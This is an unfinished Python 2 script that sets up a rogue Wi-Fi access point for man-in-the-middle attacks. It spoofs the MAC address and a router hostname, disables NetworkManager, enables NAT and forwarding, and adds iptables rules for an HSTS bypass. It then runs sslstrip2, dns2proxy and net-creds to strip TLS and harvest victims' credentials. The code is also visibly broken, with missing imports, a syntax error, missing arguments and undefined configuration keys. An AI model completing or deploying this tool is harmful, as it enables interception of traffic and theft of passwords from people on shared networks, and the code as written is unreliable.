from os import geteuid
from sys import exit
from multiprocessing import Process
from distutils.spawn import find_executable

import plugins

NETWORK_MANAGER_ALIASES = ['network-manager', 'NetworkManager']

def am_i_root():

    if geteuid():
        exit('[-] Why am I not root? I want root!')

def configure():

    return {

        'phy' : 'wlp0s20u2',
        'filter_ip' : None,
        'sslstrip2' : {

            'logfile' : 'sslstrip2.log',
            'port' : 10000,
            'fav' : False,
            'killSessions' : False,
        }
    }

def set_hostname(hostname):

    print '[*] Setting hostname to WRT54G'
    os.system('hostname WRT54G')
    time.sleep(2)

def kill_wifi():

    for alias in NETWORK_MANAGER_ALIASES:
    
        if find_executable(alias) != None:
            os.system('service %s disable' % alias)
            os.system('service %s stop' % alias)

    os.system('rfkill unblock wlan')

def spoof_mac(phy):

    os.system('ifconfig %s down' %s phy)
    os.system('macchanger -r %s' %s phy)
    os.system('ifconfig %s up'   %s phy)

def set_ip_forwarding(val):

    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
        fd.write('%d' % val)
        

if __name__ == "__main__":

    iptables.flush()

    am_i_root()

    configs = configure()

    set_hostname()

    kill_wifi()

    spoof_mac(configs['phy'])

    # configure hostapd here

    os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0')
    os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')

    set_ip_forwarding(1)

    # configure dhcpd here

    iptables.nat_full(upstream=configs['upstream'], phy=configs['phy'])

    iptables.hsts_bypass(phy=configs['phy'], sslstrip_port=configs['sslstrip']['port'])

    iptables.sslsplit(phy=configs['phy'])
    
    try:

        # start hostapd here

        # start dhcpd here

        # start sslstrip2
        #TODO make sure you pass the following flags: -a -w
        sslstrip2 = Process(target=plugins.sslstrip2, args=(configs['sslstrip2']['logfile'],
                configs['sslstrip2']['port'],
                configs['sslstrip2']['fav'],
                configs['sslstrip2']['killSessions'],))
        sslstrip2.daemon = True
        print '[*] starting sslstrip2...'
        sslstrip2.start()
        print '[*] sslstrip2 started'

        time.sleep(2)

        # start dns2proxy
        dns2proxy = Process(target=plugins.dns2proxy, args=(configs['phy'],))
        dns2proxy.daemon = True
        print '[*] starting dns2proxy...'
        dns2proxy.start()
        print '[*] dns2proxy started'

        time.sleep(2)

        # start sslsplit

        time.sleep(2)

        # start FireLamb

        # start net_creds
        net_creds = Process(target=plugins.net_creds, args=(configs['phy'],))
        net_creds.daemon = True
        print '[*] starting net-creds...'
        net_creds.start()
        print '[*] net-creds started'

        time.sleep(2)

    except KeyboardInterrupt:

        net_creds.terminate()
        sslstrip2.terminate()

        net_creds.join()
        sslstrip2.join()


    raw_input('Press enter to exit...')

    iptables.flush()



        
